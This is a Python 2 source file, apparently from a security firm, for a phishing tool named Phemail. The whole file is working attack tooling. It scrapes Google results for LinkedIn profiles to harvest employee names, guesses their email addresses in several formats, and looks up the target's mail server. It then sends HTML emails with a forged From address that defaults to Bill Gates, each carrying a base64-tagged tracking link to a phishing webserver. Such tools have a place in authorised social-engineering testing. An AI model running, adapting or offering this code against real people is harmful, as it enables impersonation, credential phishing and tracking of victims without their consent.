#!/usr/bin/python
#
# Author MM
# Copyright 2012 Dionach Ltd
#
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details. http://www.gnu.org/licenses/
#

import smtplib, base64, os, sys, getopt, urllib2, re
try:
    from BeautifulSoup import BeautifulSoup
except:
    print "No BeautifulSoup installed"
    print "See: http://www.crummy.com/software/BeautifulSoup/#Download"
    sys.exit()
try:
    import DNS
except:
    print "No pyDNS installed"
    print "python-dns package on debian"
from optparse import OptionParser
from email.mime.multipart import MIMEMultipart
from email.MIMEText import MIMEText
from datetime import datetime

version=0.6

FROM_ADDRESS = 'Bill Gates <bill.gates@microsoft.com>'
REPLY_TO_ADDRESS = 'Bill Gates <your-email-address@example.com>'
SUBJECT = 'Newsletter'
filemail = 'emails.txt'
filebody = 'body.txt'
domain = 'example.com'
user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
webserver='http://example.com'
headers={'User-Agent':user_agent,} 
p = 10
verbose = False

def gatherEmails(l,domain,p):
    print "Gathering emails from domain: "+domain
    emails = []
    for i in range(0,p):
        url = "http://www.google.co.uk/search?hl=en&safe=off&q=site:linkedin.com/pub+"+re.sub('\..*','',domain)+"&start="+str(i)+"0"
        request=urllib2.Request(url,None,headers)
        response = urllib2.urlopen(request)
        data = response.read()
        html = BeautifulSoup(data)
        for a in html.findAll('a',attrs={'class':'l'}):
            namesurname = re.sub(' -.*','',a.text.encode('utf8'))
            firstname = re.sub(' ([a-zA-Z])+','',namesurname).lower()
            surname = re.sub('([a-zA-Z])+ ','',namesurname).lower()
            sys.stdout.write("\r%d%%" %((100*(i+1))/p))
            sys.stdout.flush()
            if firstname != surname and not re.search('\W',firstname) and not re.search('\W',surname):                
                if l == '0' : # 1- firstname.surname@example.com
                    emails.append(firstname+" "+surname)
                elif l == '1' : # 1- firstname.surname@example.com
                    emails.append(firstname+"."+surname+"@"+domain)
                elif l == '2' : # 2- firstnamesurname@example.com
                    emails.append(firstname+surname+"@"+domain)
                elif l == '3' : # 3- f.surname@example.com
                    emails.append(firstname[0:1]+"."+surname+"@"+domain)
                elif l == '4' : # 4- firstname.s@example.com
                    emails.append(firstname+"."+surname[0:1]+"@"+domain)
                elif l == '5' : # 5- surname.firstname@example.com
                    emails.append(surname+"."+firstname+"@"+domain)
                elif l == '6' : # 6- s.firstname@example.com
                    emails.append(surname[0:1]+"."+firstname+"@"+domain)  
                elif l == '7' : # 7- surname.f@example.co
                    emails.append(firstname[0:1]+"@"+domain)
                elif l == '8' : # 8- surnamefirstname@example.com
                    print surname+firstname+"@"+domain
                    emails.append(surname+firstname+"@"+domain)
    # sort and unique
    emails = sorted(set(emails))
    print " Completed!\n"
    # write into file
    f = open("emails.txt","w") 
    for email in emails: f.write("%s\n" % email); print email
    f.close()
    print "\nemails.txt updated"
    sys.exit()


def sendMail():
    Emails = [line.strip() for line in open(filemail)]
    Discovered = {}
    emailSent = []
    emailFail = []
    fb = open(filebody, 'rb')
    body = fb.read()
    for email in Emails:
        domain = email.split('@')[1]
        if domain not in Discovered:
            Discovered[domain] = DiscoverSMTP(domain)   
    for domain in Discovered:
        print "SMTP server: "+Discovered[domain]
        server = smtplib.SMTP(Discovered[domain])
        server.helo('example.com')
        for email in Emails:
            if domain == email.split('@')[1]:
                msg = MIMEMultipart()
                msg['from'] = FROM_ADDRESS
                msg['subject'] = SUBJECT
                msg.add_header('reply-to', REPLY_TO_ADDRESS)
                TO_ADDRESS = email
                msg['to'] = TO_ADDRESS
                # add feature
                url=webserver+"/index.php?e="+base64.b64encode(TO_ADDRESS).rstrip("=")
                msg.attach(MIMEText(body.format(url),'html'))
                try:
                    server.sendmail(msg['from'], [msg['to']], msg.as_string())
                    print "Sent to "+email
                    emailSent.append(email)
                except Exception,e:
                    print "Error: sending to "+email
                    emailFail.append(email)
                    if verbose :
                        print e    
    fb.close()
    print "PHishing URLs point to "+webserver 
    Log(emailSent,emailFail)
    
def Log(emailSent,emailFail):
    now = datetime.now().strftime("%d-%m-%Y_%H-%M")
    f = open("phemail-log-"+now+".txt","w")
    emailSent = sorted(set(emailSent))
    emailFail = sorted(set(emailFail))
    command = ' '.join(sys.argv)
    f.write(command)
    f.write("Successful Emails Sent:\n")
    f.write("-------------------------\n")
    for email in emailSent: f.write("%s\n" % email)
    f.write("\nFailed Emails Sent:\n")
    f.write("-------------------------\n")
    for email in emailFail: f.write("%s\n" % email)
    f.close()
    print "Phemail.py log file saved: phemail-log-"+now+".txt"

def DiscoverSMTP(domain):
    DNS.DiscoverNameServers()
    mx_hosts = DNS.mxlookup(domain)
    return mx_hosts[0][1]

def usage(version):
    print "PHishing EMAIL tool v"+str(version)+"\nUsage: " + os.path.basename(sys.argv[0]) + """ [-e <emails>] [-f <from_address>] [-r <replay_address>] [-s <subject>] [-b <body>]
          -e    emails: File containing list of emails (Default: emails.txt)
          -f    from_address: Source email address displayed in FROM field of the email (Default: Bill Gates <bill.gates@microsoft.com>)
          -r    reply_address: Actual email address used to send the emails in case that people reply to the email (Default: Bill Gates <your-email-address@example.com>)
          -s    subject: Subject of the email (Default: Newsletter)
          -b    body: Body of the email (Default: body.txt)
          -w    webserver: Webserver where Phishing URLs point to (Default: http://example.com)
          -p    pages: Specifies number of results pages searched (Default: 10)
          -v    verbose: Verbose Mode (Default: false)
          -g    gather: gather emails addresses
                0- firstname surname
                1- firstname.surname@example.com
                2- firstnamesurname@example.com
                3- f.surname@example.com
                4- firstname.s@example.com
                5- surname.firstname@example.com
                6- s.firstname@example.com
                7- surname.f@example.com
                8- surnamefirstname@example.com 
          """
    print "Examples: "+ os.path.basename(sys.argv[0]) +" -e emails.txt -f \"Fast Holiday <info@fastholiday.com>\" -r \"Fast Holiday <your-email-address@example.com>\" -s \"Last Minute Holiday\" -b body.txt"
    print "          "+ os.path.basename(sys.argv[0]) +" -g 1@example.com -p 12"

if __name__ == "__main__":
    # command line arguments / switches
    if sys.argv[1:]:
        optlist, args = getopt.getopt(sys.argv[1:], 'he:f:r:s:b:p:g:w:v')

        for o, a in optlist:
            if o == "-h":
                usage(version)
            elif o == "-e":
                filemail = a
            elif o == "-f":
                FROM_ADDRESS = a
            elif o == "-r":
                REPLY_TO_ADDRESS = a
            elif o == "-s":
                SUBJECT = a
            elif o == "-b":
                filebody = a
            elif o == "-g":
                domain = a.split('@')
            elif o == "-p":
                p = int(a)
            elif o == "-w":
                webserver = a
            elif o == "-v":
                verbose = True
            else:
                usage(version)
                sys.exit()
                
    else:
        usage(version)
        sys.exit()
    
    if not domain == "example.com" :
        gatherEmails(domain[0],domain[1],p)

    sendMail()
